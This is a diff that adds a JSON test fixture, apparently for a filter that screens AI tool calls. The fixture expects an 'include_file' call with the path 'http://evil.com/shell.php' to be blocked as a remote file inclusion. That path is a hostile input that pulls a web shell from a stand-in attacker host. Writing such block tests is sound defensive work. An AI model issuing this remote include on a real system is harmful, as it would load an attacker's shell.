@@ -1,0 +1,9 @@
+{
+  "toolName": "include_file",
+  "arguments": {
+    "path": "http://evil.com/shell.php"
+  },
+  "expected": "block",
+  "category": "file-inclusion",
+  "ruleHint": "remote-include"
+}
